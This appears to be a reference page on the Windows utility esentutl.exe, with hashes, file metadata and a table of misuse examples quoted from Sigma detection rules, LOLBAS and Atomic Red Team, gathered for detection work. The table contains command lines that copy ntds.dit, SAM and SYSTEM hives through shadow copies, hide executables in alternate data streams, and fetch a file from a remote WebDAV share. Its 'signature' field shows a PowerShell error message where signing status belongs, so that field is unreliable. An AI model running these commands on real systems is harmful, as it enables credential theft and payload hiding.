---
title: esentutl.exe | Extensible Storage Engine Utilities for Microsoft(R) Windows(R)
excerpt: What is esentutl.exe?
---

# esentutl.exe 

* File Path: `C:\windows\SysWOW64\esentutl.exe`
* Description: Extensible Storage Engine Utilities for Microsoft(R) Windows(R)

## Hashes

Type | Hash
-- | --
MD5 | `56D59A78F7E260137706C681F808B5B9`
SHA1 | `2CC0395A58C2FA2B1CE15D70718420BA3054C1F2`
SHA256 | `3DFA41F89ABFEB121BF98D70A94C4C7F01960E8D48195AE82C7045DAB46F7366`
SHA384 | `193080C3A7CD849613A80577F7A66F00A17DE92C582033176A212A4292EB64A2C9CE969DF2341D7E4B51E61EBB58581D`
SHA512 | `94CEC8FD27B1227455FD747FEA0A34CFE7C4335A6D0D180F0E3BD580842A527882704D6DDD5B6BA62B162ACB27ABF62EEC3333AF4299B8CA0AE24BFEBCD3EB1F`
SSDEEP | `3072:d3fxCdL/4n2T6ZVVxmL/GrdTobO2tQ8YE82WAZj4QPJgYzWexVwuUg+L9G40jQLW:dERGritQ8YE82WmjkUzCvLKJFc2`

## Signature

* Status: The file C:\windows\SysWOW64\esentutl.exe is not digitally signed. You cannot run this script on the current system. For more information about running scripts and setting execution policy, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170
* Serial: ``
* Thumbprint: ``
* Issuer: 
* Subject: 

## File Metadata

* Original Filename: esentutl.exe
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 6.3.9600.17415 (winblue_r4.141028-1500)
* Product Version: 6.3.9600.17415
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.



## Possible Misuse

*The following table contains possible examples of `esentutl.exe` being misused. While `esentutl.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_suspicious_remote_thread.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/create_remote_thread/sysmon_suspicious_remote_thread.yml) | `- '\esentutl.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_esentutl_activity.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/deprecated/win_susp_esentutl_activity.yml) | `title: Suspicious Esentutl Use`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_esentutl_activity.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/deprecated/win_susp_esentutl_activity.yml) | `description: Detects flags often used with the LOLBAS Esentutl for malicious activity. It could be used in rare cases by administrators to access locked files or during maintenance. `{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_vssadmin_ntds_activity.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/deprecated/win_susp_vssadmin_ntds_activity.yml) | `- https://dfironthemountain.wordpress.com/2018/12/06/locked-file-access-using-esentutl-exe/`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_vssadmin_ntds_activity.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/deprecated/win_susp_vssadmin_ntds_activity.yml) | `- esentutl.exe /y /vss *\ntds.dit*`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_vssadmin_ntds_activity.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/deprecated/win_susp_vssadmin_ntds_activity.yml) | `- esentutl.exe /y /vss *\SAM`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_vssadmin_ntds_activity.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/deprecated/win_susp_vssadmin_ntds_activity.yml) | `- esentutl.exe /y /vss *\SYSTEM`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_alternate_data_streams.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_alternate_data_streams.yml) | `- 'esentutl '`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_susp_esentutl_params.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_susp_esentutl_params.yml) | `title: Esentutl Gather Credentials`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_susp_esentutl_params.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_susp_esentutl_params.yml) | `- 'esentutl'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_copying_sensitive_files_with_credential_data.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_copying_sensitive_files_with_credential_data.yml) | `- https://dfironthemountain.wordpress.com/2018/12/06/locked-file-access-using-esentutl-exe/`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_copying_sensitive_files_with_credential_data.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_copying_sensitive_files_with_credential_data.yml) | `- Image\|endswith: '\esentutl.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Esentutl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Esentutl.yml) | `Name: Esentutl.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Esentutl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Esentutl.yml) | `- Command: esentutl.exe /y C:\folder\sourcefile.vbs /d C:\folder\destfile.vbs /o`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Esentutl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Esentutl.yml) | `- Command: esentutl.exe /y C:\ADS\file.exe /d c:\ADS\file.txt:file.exe /o`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Esentutl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Esentutl.yml) | `- Command: esentutl.exe /y C:\ADS\file.txt:file.exe /d c:\ADS\file.exe /o`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Esentutl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Esentutl.yml) | `- Command: esentutl.exe /y \\192.168.100.100\webdav\file.exe /d c:\ADS\file.txt:file.exe /o`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Esentutl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Esentutl.yml) | `- Command: esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d \\otherwebdavserver\webdav\adrestore.exe /o`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Esentutl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Esentutl.yml) | `- Command: esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\folder\ntds.dit`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Esentutl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Esentutl.yml) | `- Path: C:\Windows\System32\esentutl.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Esentutl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Esentutl.yml) | `- Path: C:\Windows\SysWOW64\esentutl.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Esentutl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Esentutl.yml) | `- Link: https://dfironthemountain.wordpress.com/2018/12/06/locked-file-access-using-esentutl-exe/`{:.highlight .language-yaml} | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #3: esentutl.exe SAM copy [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #3: esentutl.exe SAM copy [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1003.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md) | - [Atomic Test #3 - esentutl.exe SAM copy](#atomic-test-3---esentutlexe-sam-copy) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1003.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md) | ## Atomic Test #3 - esentutl.exe SAM copy | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1003.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md) | Copy the SAM hive using the esentutl.exe utility | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1003.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md) | esentutl.exe /y /vss #{file_path} /d #{copy_dest}/#{file_name} | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1564.004.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.004/T1564.004.md) | esentutl.exe /y #{path}\autoruns.exe /d #{path}\file.txt:autoruns.exe /o | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)



MIT License. Copyright (c) 2020-2021 Strontic.


